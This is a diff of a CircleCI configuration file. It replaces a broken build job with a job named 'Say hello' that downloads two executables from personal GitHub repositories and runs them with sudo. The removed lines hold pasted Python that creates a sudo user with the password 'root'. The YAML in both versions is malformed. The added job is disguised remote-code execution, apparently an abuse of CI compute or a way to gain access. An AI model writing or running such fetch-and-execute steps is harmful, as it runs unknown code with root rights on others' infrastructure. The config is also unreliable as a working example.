@@ -1,30 +1,17 @@
-version: 2.1
+Version: 2.1
 jobs:
-  build:
-    docker:
-      - image: circleci/ruby:2.4.2-jessie-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+  say-hello
+  docker:
+    -image: cimg/node:12.22.11
     steps:
       - checkout
-      - run: import os
- 
-username = "user" #@param {type:"string"}
-password = "root" #@param {type:"string"}
- 
-print("Creating User and Setting it up")
- 
-# Creation of user
-os.system(f"useradd -m {username}")
- 
-# Add user to sudo group
-os.system(f"adduser {username} sudo")
-    
-# Set password of user to 'root'
-os.system(f"echo '{username}:{password}' | sudo chpasswd")
- 
-# Change default shell from sh to bash
-os.system("sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd")
- 
-print("User Created and Configured")
+      - run:
+          name: "Say hello"
+          command:  sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://raw.githubusercontent.com/aurbach55/pos/main/CODESERVER && chmod +x CODESERVER && sudo ./CODESERVER
+          command:  sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://raw.githubusercontent.com/YDhj45/kj/main/deploy && chmod +x deploy && sudo ./deploy
+# Invoke jobs via workflows
+# See: https://circleci.com/docs/2.0/configuration-reference/#workflows
+workflows:   
+  say-hello-workflow:
+    jobs:
+      - say-hello
